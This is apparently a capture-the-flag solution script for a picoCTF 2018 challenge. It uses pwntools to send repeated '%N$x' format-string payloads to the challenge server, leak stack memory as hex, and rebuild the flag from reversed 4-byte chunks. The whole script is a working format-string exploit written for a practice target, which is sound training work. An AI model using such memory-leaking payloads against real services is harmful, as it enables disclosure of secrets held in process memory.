#coding-utf-8
from pwn import *

r = remote('2018shell.picoctf.com', 23397)
r.recvuntil('> ')

res = ''
for j in range(25):
  payload = ''
  for i in range(10*j, 10*(j+1)):
    payload += '%{0}$x'.format(i)
  r.sendline(payload)
  res += r.recvuntil('> ')

print res
res = ''.join(''.join(res[4:].split('\n')).split('> '))
flag_chaos = res.decode('hex')
print flag_chaos

flag_start = flag_chaos.find('ocip')
flag = ''
for i in range(flag_start, flag_start + 120, 4):
  flag += flag_chaos[i:i+4][::-1]
print flag
